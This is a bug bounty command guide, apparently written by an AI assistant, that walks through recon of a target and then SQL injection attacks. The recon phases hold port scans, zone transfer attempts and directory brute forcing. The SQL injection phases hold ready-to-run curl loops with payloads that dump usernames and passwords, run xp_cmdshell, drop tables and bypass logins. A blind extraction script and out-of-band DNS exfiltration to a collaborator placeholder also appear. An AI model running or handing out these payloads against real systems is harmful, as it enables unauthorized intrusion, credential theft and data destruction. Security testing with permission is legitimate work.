# Bug Bounty Recon & SQL Injection Command Guide


## 🗂️ Variables — Set These First

```bash
export TARGET="target.com"
export IP="1.2.3.4"          # fill after phase 1
export URL="https://target.com"
```

---

## Phase 1 — Fingerprinting & Basic IP Recon

**Save file: `01_fingerprint.txt`**

```bash
# Basic IP resolution
host $TARGET | tee 01_fingerprint.txt
dig +short $TARGET >> 01_fingerprint.txt
nslookup $TARGET >> 01_fingerprint.txt

# Whois
whois $TARGET >> 01_fingerprint.txt
whois $IP >> 01_fingerprint.txt

# OS & service fingerprinting — aggressive, version detection, scripts
sudo nmap -A -T4 -sV -sC -O $TARGET -oN 01_fingerprint.txt

# Grab ASN / IP ownership
curl -s "https://ipinfo.io/$IP/json" >> 01_fingerprint.txt

# Naabu fast port scan (feeds into phase 3)
naabu -host $TARGET -p - -o 01_naabu_allports.txt
```

---

## Phase 2 — Reverse IP & Full DNS Records

**Save file: `02_dns_recon.txt`**

```bash
# All DNS records
dig ANY $TARGET +noall +answer | tee 02_dns_recon.txt
dig A $TARGET +short >> 02_dns_recon.txt
dig AAAA $TARGET +short >> 02_dns_recon.txt
dig MX $TARGET +short >> 02_dns_recon.txt
dig TXT $TARGET +short >> 02_dns_recon.txt
dig NS $TARGET +short >> 02_dns_recon.txt
dig CNAME www.$TARGET +short >> 02_dns_recon.txt
dig SOA $TARGET +short >> 02_dns_recon.txt
dig SRV $TARGET +short >> 02_dns_recon.txt
dig CAA $TARGET +short >> 02_dns_recon.txt
dig SPF $TARGET +short >> 02_dns_recon.txt
dig DMARC _dmarc.$TARGET +short >> 02_dns_recon.txt
dig DKIM default._domainkey.$TARGET +short >> 02_dns_recon.txt

# Reverse IP lookup (who else is on this IP)
curl -s "https://api.hackertarget.com/reverseiplookup/?q=$IP" >> 02_dns_recon.txt

# DNS zone transfer attempt (often misconfigured)
dig axfr $TARGET @$(dig NS $TARGET +short | head -1) >> 02_dns_recon.txt

# Subdomain brute-force
subfinder -d $TARGET -o 02_subdomains.txt
amass enum -passive -d $TARGET >> 02_subdomains.txt
assetfinder --subs-only $TARGET >> 02_subdomains.txt

# Resolve live subdomains
cat 02_subdomains.txt | sort -u | httpx -silent -o 02_live_subdomains.txt
```

---

## Phase 3 — Port, OS, DB & Service Discovery

**Save file: `03_ports.txt`**

```bash
# Full TCP port scan — all 65535 ports
sudo nmap -p- -T4 --open $TARGET -oN 03_ports_all.txt

# Top ports with version + scripts (fast)
sudo nmap -sV -sC -p 21,22,23,25,53,80,110,143,443,445,3306,5432,6379,27017,9200,8080,8443,8888 $TARGET -oN 03_ports_common.txt

# UDP scan (DNS 53, SNMP 161, NTP 123)
sudo nmap -sU -T4 --top-ports 200 $TARGET -oN 03_ports_udp.txt

# OS detection
sudo nmap -O --osscan-guess $TARGET >> 03_ports.txt

# DB-specific ports
sudo nmap -p 3306,5432,1433,1521,27017,6379,9200,5984,7474,8098,11211,5000 \
  -sV --script=banner,mysql-info,pgsql-brute,ms-sql-info,mongodb-info \
  $TARGET -oN 03_db_ports.txt

# Hidden / filtered port detection
sudo nmap -sF -T4 --open $TARGET -oN 03_ports_fin.txt
sudo nmap -sX -T4 --open $TARGET -oN 03_ports_xmas.txt
sudo nmap -sN -T4 --open $TARGET -oN 03_ports_null.txt

# Stack detection via nmap scripts
sudo nmap -sV --script=http-headers,http-server-header,http-title,http-tech \
  -p 80,443,8080,8443 $TARGET -oN 03_stack_discovery.txt

# Transport / SSL check
sudo nmap --script=ssl-enum-ciphers,ssl-cert,ssl-dh-params -p 443,8443 $TARGET -oN 03_ssl.txt
```

**Key DB ports to note:**

| Service | Port |
|---|---|
| MySQL | 3306 |
| PostgreSQL | 5432 |
| MSSQL | 1433 |
| Oracle | 1521 |
| MongoDB | 27017 |
| Redis | 6379 |
| Elasticsearch | 9200 |
| CouchDB | 5984 |
| Neo4j | 7474 |
| Memcached | 11211 |

---

## Phase 4 — Deep Crawl with Katana

**Save file: `04_katana_crawl.txt`**

```bash
# Full crawl — all methods, JS parsing, headless, depth 10
katana -u $URL \
  -d 10 \
  -jc \
  -hl \
  -fx \
  -xhr \
  -aff \
  -em js,json,php,asp,aspx,jsp,html,txt,xml \
  -H "User-Agent: Mozilla/5.0" \
  -o 04_katana_crawl.txt

# Crawl with all HTTP methods (GET, POST, DELETE, PUT)
katana -u $URL -d 8 -jc -hl -fx -H "User-Agent: Mozilla/5.0" \
  -filter-regex "logout|signout|delete" \
  -o 04_katana_all_methods.txt

# Crawl API endpoints only
katana -u $URL -d 10 -jc -hl -fx \
  -match-regex "api|v1|v2|v3|graphql|rest|endpoint|json|xml" \
  -o 04_katana_api.txt

# Crawl with scope — don't leave the target
katana -u $URL -d 10 -jc -hl -fx \
  -field url \
  -scope "$TARGET" \
  -o 04_katana_inscope.txt

# Extract all unique params
cat 04_katana_crawl.txt | grep "?" | grep -oP '[\?&][^=\s]+=' | sort -u \
  | tee 04_katana_params.txt
```

---

## Phase 5 — Banner Grabbing & Complete Header Analysis

**Save file: `05_headers.txt`**

```bash
# Full headers — verbose, all layers
curl -sSL -D - -o /dev/null \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --max-time 15 \
  $URL | tee 05_headers.txt

# HTTPS + SSL certificate info
curl -vvv --ssl-no-revoke $URL 2>&1 | tee 05_ssl_detail.txt

# Check for missing security headers (Security header audit)
curl -sI $URL | grep -iE \
  "server:|x-powered-by:|x-aspnet-version:|x-aspnetmvc-version:|strict-transport-security:|content-security-policy:|x-frame-options:|x-content-type-options:|referrer-policy:|permissions-policy:|feature-policy:|access-control-allow-origin:|set-cookie:|x-xss-protection:|expect-ct:|cross-origin-opener-policy:|cross-origin-resource-policy:|nel:|report-to:" \
  | tee 05_security_headers.txt

# Check what headers are MISSING (security audit)
for HEADER in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" \
  "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy" \
  "Cross-Origin-Opener-Policy" "Cross-Origin-Resource-Policy" "X-XSS-Protection"; do
  if ! curl -sI $URL | grep -qi "$HEADER"; then
    echo "MISSING: $HEADER" | tee -a 05_missing_headers.txt
  fi
done

# Banner grab all subdomains
while read line; do
  echo "=== $line ===" >> 05_banners_all.txt
  curl -sI --max-time 5 "https://$line" >> 05_banners_all.txt 2>&1
done < 02_live_subdomains.txt
```

---

## Phase 6 — Directory & File Structure Enumeration

**Save file: `06_directories.txt`**

```bash
# Feroxbuster — recursive, all extensions
feroxbuster -u $URL \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,js,json,txt,xml,bak,old,conf,config,yaml,yml,env,log,sql,db \
  -r -d 5 \
  --threads 50 \
  -o 06_directories.txt

# Gobuster
gobuster dir -u $URL \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,html,txt,js,json,sql,bak,conf \
  -t 50 \
  -o 06_gobuster.txt

# ffuf — fast, with status filter
ffuf -u "$URL/FUZZ" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,204,301,302,307,401,403 \
  -t 50 \
  -o 06_ffuf.txt -of md

# Backup file discovery
ffuf -u "$URL/FUZZ" \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt \
  -e .bak,.old,.tmp,.backup,.sql,.tar.gz,.zip \
  -mc 200,301 \
  -o 06_backups.txt -of md

# Admin panel discovery
gobuster dir -u $URL \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/AdminPanels.fuzz.txt \
  -o 06_admin_panels.txt
```

---

## Phase 7 — Sitemap, API & Hidden Endpoint Discovery

**Save file: `07_sitemaps.txt`**

```bash
# Fetch standard sitemaps
curl -s "$URL/sitemap.xml" -o 07_sitemap.xml
curl -s "$URL/sitemap_index.xml" -o 07_sitemap_index.xml
curl -s "$URL/robots.txt" -o 07_robots.txt

# Extract URLs from sitemaps
grep -oP 'https?://[^\s<>"]+' 07_sitemap.xml | tee 07_sitemap_urls.txt
grep -oP 'https?://[^\s<>"]+' 07_sitemap_index.xml >> 07_sitemap_urls.txt

# Check common API sitemap paths
for PATH in sitemap_api.xml api-sitemap.xml sitemap-api.xml api/sitemap.xml \
  api/v1/sitemap.xml api/v2/sitemap.xml graphql-sitemap.xml; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "$URL/$PATH")
  echo "$STATUS $URL/$PATH" >> 07_api_sitemaps.txt
  if [ "$STATUS" = "200" ]; then
    curl -s "$URL/$PATH" >> 07_api_sitemaps_content.txt
  fi
done

# Wayback Machine historical endpoints
curl -s "https://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=txt&fl=original&collapse=urlkey" \
  | sort -u | tee 07_wayback_urls.txt

# Extract params from wayback
cat 07_wayback_urls.txt | grep "?" | tee 07_wayback_params.txt
```

---

## Phase 8 — Advanced Crawl: GoSpider + LinkFinder Parameter Harvest

**Save file: `08_advanced_crawl.txt`**

```bash
# GoSpider — third-party sources, JS, forms
gospider -s $URL \
  -c 20 \
  -d 5 \
  --js \
  --sitemap \
  --robots \
  --other-source \
  --include-subs \
  -o 08_gospider/ | tee 08_gospider_raw.txt

# Flatten gospider output
cat 08_gospider/* 2>/dev/null | grep -oP 'https?://[^\s"]+' | sort -u \
  | tee 08_gospider_urls.txt

# LinkFinder — extract endpoints from JS files
# First collect JS files
grep "\.js" 04_katana_crawl.txt | sort -u | tee 08_js_files.txt

while read jsfile; do
  python3 linkfinder.py -i "$jsfile" -o cli 2>/dev/null >> 08_linkfinder.txt
done < 08_js_files.txt

# Extract GET parameters
cat 08_gospider_urls.txt 04_katana_crawl.txt 07_wayback_urls.txt \
  | grep "?" | grep -oP '[\?&]([^=\s]+)=' | sort -u | tee 08_all_get_params.txt

# Discover hidden POST parameters via Arjun
arjun -u $URL -oJ 08_arjun_params.json
arjun -u $URL -m POST -oJ 08_arjun_post_params.json

# Header-based parameter discovery
while read endpoint; do
  curl -sI "$endpoint" | grep -iE "x-|accept|content-|api-|auth-|token|key|secret" \
    >> 08_header_params.txt 2>/dev/null
done < 02_live_subdomains.txt
```

---

## Phase 8b — Critical Port Probing

**Save file: `08b_critical_ports.txt`**

```bash
# All specified ports — banner + headers
for PORT in 80 443 81 300 591 593 832 981 1010 1311 3000 4243 7474 \
  9000 9200 11371 3128 8118 8123 8222 7000 8042 8888; do
  echo "=== PORT $PORT ===" >> 08b_critical_ports.txt
  PROTO="http"
  [ "$PORT" = "443" ] && PROTO="https"
  curl -sk --max-time 5 -I "$PROTO://$TARGET:$PORT" >> 08b_critical_ports.txt 2>&1
  echo "" >> 08b_critical_ports.txt
done

# Quick nmap on these exact ports
sudo nmap -sV -p 80,443,81,300,591,593,832,981,1010,1311,3000,4243,7474,\
9000,9200,11371,3128,8118,8123,8222,7000,8042,8888 \
  $TARGET -oN 08b_critical_ports_nmap.txt
```

---

## Phase 9 — SQL Injection Headers (Curl)

**Save file: `09_sqli_headers.txt`**

These headers are the highest-value injection points for SQLi:

```bash
# SQL-injectable headers to test
SQLI_HEADERS=(
  "X-Forwarded-For"
  "X-Forwarded-Host"
  "X-Real-IP"
  "X-Client-IP"
  "X-Remote-IP"
  "X-Remote-Addr"
  "X-Custom-IP-Authorization"
  "X-Originating-IP"
  "X-Host"
  "User-Agent"
  "Referer"
  "Cookie"
  "X-Api-Key"
  "Authorization"
  "X-Auth-Token"
)

# Basic SQLi payloads in each header
PAYLOAD="' OR '1'='1"
for HEADER in "${SQLI_HEADERS[@]}"; do
  echo "Testing $HEADER..." >> 09_sqli_headers.txt
  curl -sk --max-time 10 \
    -H "$HEADER: $PAYLOAD" \
    -H "User-Agent: Mozilla/5.0" \
    $URL >> 09_sqli_headers.txt 2>&1
  echo "---" >> 09_sqli_headers.txt
done

# Error-triggering payloads in Referer and User-Agent
for PAYLOAD in "'" "''" "' OR 1=1--" "1 AND SLEEP(5)--" \
  "1; DROP TABLE--" "' UNION SELECT NULL--"; do
  curl -sk --max-time 15 \
    -H "Referer: $PAYLOAD" \
    -H "X-Forwarded-For: $PAYLOAD" \
    -A "$PAYLOAD" \
    $URL -o /dev/null -w "%{http_code} | Time: %{time_total}s\n" \
    | tee -a 09_sqli_headers.txt
done
```

---

## Phase 10 — SQL Injection GET/POST Payloads (All DB Types)

**Save file: `10_sqli_payloads.txt`**

```bash
ENDPOINT="$URL/search?q="    # Change to your target parameter

# === MySQL Payloads ===
MYSQL_PAYLOADS=(
  "'"
  "' OR '1'='1"
  "' OR 1=1--"
  "' OR 1=1#"
  "' OR 1=1/*"
  "admin'--"
  "' UNION SELECT NULL--"
  "' UNION SELECT NULL,NULL--"
  "' UNION SELECT NULL,NULL,NULL--"
  "' UNION SELECT 1,database(),3--"
  "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
  "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
  "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--"
  "1 AND SLEEP(5)--"
  "1 AND (SELECT SLEEP(5))--"
  "1; WAITFOR DELAY '0:0:5'--"
)

for PAYLOAD in "${MYSQL_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))" 2>/dev/null || echo "$PAYLOAD")
  echo "PAYLOAD: $PAYLOAD" >> 10_sqli_payloads.txt
  curl -sk --max-time 15 \
    "${ENDPOINT}${ENCODED}" \
    -o /dev/null -w "Status: %{http_code} | Time: %{time_total}s\n" \
    | tee -a 10_sqli_payloads.txt
done

# === PostgreSQL Payloads ===
PGSQL_PAYLOADS=(
  "'; SELECT pg_sleep(5)--"
  "' UNION SELECT NULL,version()--"
  "' UNION SELECT NULL,current_database()--"
  "' UNION SELECT NULL,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--"
  "'; COPY (SELECT '') TO PROGRAM 'nslookup YOURCOLLABORATOR'--"
  "1 AND 1=CAST((SELECT version()) AS INT)--"
)

for PAYLOAD in "${PGSQL_PAYLOADS[@]}"; do
  echo "PGSQL: $PAYLOAD" >> 10_sqli_payloads.txt
  curl -sk --max-time 15 \
    "${ENDPOINT}${PAYLOAD}" \
    -o /dev/null -w "Status: %{http_code} | Time: %{time_total}s\n" \
    | tee -a 10_sqli_payloads.txt
done

# === MSSQL Payloads ===
MSSQL_PAYLOADS=(
  "' WAITFOR DELAY '0:0:5'--"
  "'; EXEC xp_cmdshell('whoami')--"
  "' UNION SELECT NULL,@@version--"
  "' UNION SELECT NULL,db_name()--"
  "' UNION SELECT NULL,name FROM sysdatabases--"
  "' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'--"
  "1; EXEC sp_configure 'show advanced options',1--"
)

for PAYLOAD in "${MSSQL_PAYLOADS[@]}"; do
  echo "MSSQL: $PAYLOAD" >> 10_sqli_payloads.txt
  curl -sk --max-time 15 "${ENDPOINT}${PAYLOAD}" \
    -o /dev/null -w "Status: %{http_code} | Time: %{time_total}s\n" \
    | tee -a 10_sqli_payloads.txt
done

# === Oracle Payloads ===
ORACLE_PAYLOADS=(
  "' UNION SELECT NULL FROM dual--"
  "' UNION SELECT NULL,NULL FROM dual--"
  "' UNION SELECT banner,NULL FROM v\$version--"
  "' UNION SELECT table_name,NULL FROM all_tables--"
  "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--"
  "' AND 1=dbms_pipe.receive_message('a',5)--"
)

for PAYLOAD in "${ORACLE_PAYLOADS[@]}"; do
  echo "ORACLE: $PAYLOAD" >> 10_sqli_payloads.txt
  curl -sk --max-time 15 "${ENDPOINT}${PAYLOAD}" \
    -o /dev/null -w "Status: %{http_code} | Time: %{time_total}s\n" \
    | tee -a 10_sqli_payloads.txt
done

# POST body SQL injection
POST_URL="$URL/login"
for PAYLOAD in "admin'--" "' OR 1=1--" "' OR '1'='1" \
  "admin'/*" "') OR ('1'='1"; do
  echo "POST PAYLOAD: $PAYLOAD" >> 10_sqli_payloads.txt
  curl -sk --max-time 15 \
    -X POST "$POST_URL" \
    -d "username=$PAYLOAD&password=test" \
    -w "Status: %{http_code} | Time: %{time_total}s\n" \
    | tee -a 10_sqli_payloads.txt
done
```

---

## Phase 11 — Blind & Time-Based SQL Injection

**Save file: `11_sqli_blind.txt`**

```bash
ENDPOINT="$URL/item?id="

# === Boolean-based blind ===
# TRUE condition (should return normal response)
curl -sk "$ENDPOINT 1 AND 1=1--" -o /dev/null -w "TRUE: %{http_code} | %{size_download} bytes\n" \
  | tee 11_sqli_blind.txt
# FALSE condition (should return different response)
curl -sk "$ENDPOINT 1 AND 1=2--" -o /dev/null -w "FALSE: %{http_code} | %{size_download} bytes\n" \
  | tee -a 11_sqli_blind.txt

# Extract DB name char by char (boolean blind)
for I in $(seq 1 20); do
  for C in $(seq 97 122); do
    PAYLOAD="1 AND SUBSTRING(database(),$I,1)=CHAR($C)--"
    SIZE=$(curl -sk "${ENDPOINT}${PAYLOAD}" -o /dev/null -w "%{size_download}")
    if [ "$SIZE" != "BASELINESIZE" ]; then
      printf "Char $I = $(printf \\$(printf '%03o' $C))\n" >> 11_sqli_blind.txt
    fi
  done
done

# === Time-based blind — MySQL ===
for DELAY in 3 5 10; do
  PAYLOAD="1 AND IF(1=1,SLEEP($DELAY),0)--"
  TIME=$(curl -sk --max-time 20 "${ENDPOINT}${PAYLOAD}" \
    -o /dev/null -w "%{time_total}")
  echo "MySQL SLEEP($DELAY): ${TIME}s" >> 11_sqli_blind.txt
done

# === Time-based — PostgreSQL ===
curl -sk --max-time 15 \
  "${ENDPOINT}'; SELECT pg_sleep(5)--" \
  -o /dev/null -w "PgSQL sleep: %{time_total}s\n" \
  | tee -a 11_sqli_blind.txt

# === Time-based — MSSQL ===
curl -sk --max-time 15 \
  "${ENDPOINT}'; WAITFOR DELAY '0:0:5'--" \
  -o /dev/null -w "MSSQL WAITFOR: %{time_total}s\n" \
  | tee -a 11_sqli_blind.txt

# === Out-of-band (OOB) — requires Burp Collaborator or interactsh ===
# Set your collaborator URL
COLLAB="YOUR.INTERACTSH.OR.BURP.URL"

# MySQL DNS exfil
curl -sk "${ENDPOINT}' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.${COLLAB}\\\\share\\\\a')))--"

# MSSQL DNS
curl -sk "${ENDPOINT}'; EXEC master..xp_dirtree '//${COLLAB}/a'--"

# PostgreSQL DNS
curl -sk "${ENDPOINT}'; COPY (SELECT '') TO PROGRAM 'nslookup ${COLLAB}'--"
```

---

## Summary: Output Files Reference

| File | Contents |
|---|---|
| `01_fingerprint.txt` | nmap OS/service, basic IP, ASN |
| `01_naabu_allports.txt` | All open ports from naabu |
| `02_dns_recon.txt` | All DNS records, zone transfer |
| `02_subdomains.txt` | All discovered subdomains |
| `02_live_subdomains.txt` | Live HTTP/HTTPS subdomains |
| `03_ports_all.txt` | Full TCP 65535 port scan |
| `03_db_ports.txt` | DB service fingerprints |
| `03_ssl.txt` | SSL/TLS cipher & cert info |
| `03_stack_discovery.txt` | Tech stack from nmap scripts |
| `04_katana_crawl.txt` | All crawled endpoints |
| `04_katana_api.txt` | API-specific endpoints |
| `05_headers.txt` | Full HTTP headers |
| `05_missing_headers.txt` | Missing security headers |
| `05_ssl_detail.txt` | SSL verbosity dump |
| `06_directories.txt` | Directory brute-force results |
| `06_backups.txt` | Backup file discoveries |
| `07_sitemap_urls.txt` | All sitemap URLs |
| `07_wayback_urls.txt` | Historical URLs from Wayback |
| `08_gospider_urls.txt` | GoSpider crawl results |
| `08_linkfinder.txt` | JS endpoint extraction |
| `08_all_get_params.txt` | All discovered GET parameters |
| `08b_critical_ports.txt` | Specific port HTTP responses |
| `09_sqli_headers.txt` | Header injection test results |
| `10_sqli_payloads.txt` | GET/POST SQLi test results |
| `11_sqli_blind.txt` | Time-based & boolean blind results |

---

## ⚡ 8-Hour Challenge — Order of Attack

1. `01–03` Fingerprinting + ports — **45 min** (run nmap in background while doing DNS)
2. `04` Katana crawl — **30 min** (run in background)
3. `07–08` Sitemap + GoSpider + Wayback — **30 min**
4. `05–06` Headers + directory brute — **60 min**
5. `09` Header SQLi sweep — **30 min** ← easy wins here
6. `10–11` Param-based + blind SQLi — **2 hours**
7. Review all `.txt` outputs, triage, write report — **remaining time**

> **Tip:** Run Katana, nmap, and GoSpider in parallel using `tmux` or separate terminals so passive recon runs while you analyze earlier results. Every command above is scoped to SQLi only as requested — no XSS, SSRF, or other vectors included.
